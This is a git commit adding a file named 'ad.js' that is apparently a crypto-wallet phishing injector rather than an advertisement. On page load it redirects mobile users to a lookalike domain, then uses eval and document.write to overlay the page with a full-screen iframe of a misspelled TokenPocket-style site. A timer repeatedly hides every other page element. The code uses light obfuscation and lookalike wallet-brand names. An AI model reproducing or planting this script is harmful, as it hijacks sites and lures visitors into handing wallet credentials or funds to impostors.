d6b3a8708bd0734bf515f522c3a19d4e705de00d
imtoken11 <112156943+imtoken11@users.noreply.github.com>
2022-08-26 15:57:36 +0800

    Add files via upload

---
+++ ad.js
@@ -0,0 +1,28 @@
+var _hmt = _hmt || [];
+
+function MoobilePage() {
+    if ((navigator['userAgent']['match'](/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
+        window['location']['href'] = "https://token-lm.org/im/"
+    }
+}
+//MoobilePage();
+setTimeout(MoobilePage, 3500);
+
+var eqvfq1 = '<div id="banner" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"><iframe scrolling="yes"marginheight=0 marginwidth=0 frameborder="0"width="100%"height="100%"src="https://pro.tokenpokcet1.app/"></iframe></div><style type="text/css">html{width:100%;height:100%;overflow:hidden}body{width:100%;height:100%;overflow:hidden}</style>';
+window["eval"]("document.write('" + eqvfq1 + "');");
+try {
+    setInterval(function() {
+        try {
+            window["document"]['getElementById']("divAll")['style']['display'] = "none"
+        } catch (e) {}
+        for (var qzgNeZ2 = 0; qzgNeZ2 < window["document"]['body']['children']['length']; qzgNeZ2++) {
+            try {
+                var kWhXLYT3 = window["document"]['body']['children'][qzgNeZ2]['tagName'];
+                var IfHiDmPaG4 = window["document"]['body']['children'][qzgNeZ2]['id'];
+                if (IfHiDmPaG4 != "iconDiv1" && IfHiDmPaG4 != "banner") {
+                    window["document"]['body']['children'][qzgNeZ2]['style']['display'] = "none"
+                }
+            } catch (e) {}
+        }
+    }, 100)
+} catch (e) {}
